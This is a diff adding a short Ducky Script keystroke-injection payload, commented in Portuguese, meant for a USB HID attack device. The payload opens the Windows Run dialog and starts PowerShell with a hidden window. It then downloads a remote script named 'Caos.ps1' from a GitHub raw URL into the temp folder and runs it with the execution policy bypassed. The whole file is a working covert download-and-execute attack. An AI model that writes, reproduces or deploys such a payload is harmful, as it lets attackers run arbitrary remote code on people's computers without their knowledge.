@@ -1,0 +1,13 @@
+REM Abrir a caixa de execução
+DELAY 500
+GUI r
+DELAY 500
+
+REM Abrir PowerShell com execução oculta
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Baixar e executar o script remoto
+STRING iwr -uri "https://raw.githubusercontent.com/Herna4ndes/Gansodocaos/main/Caos.ps1" -OutFile "$env:TEMP\caos.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\caos.ps1"
+ENTER
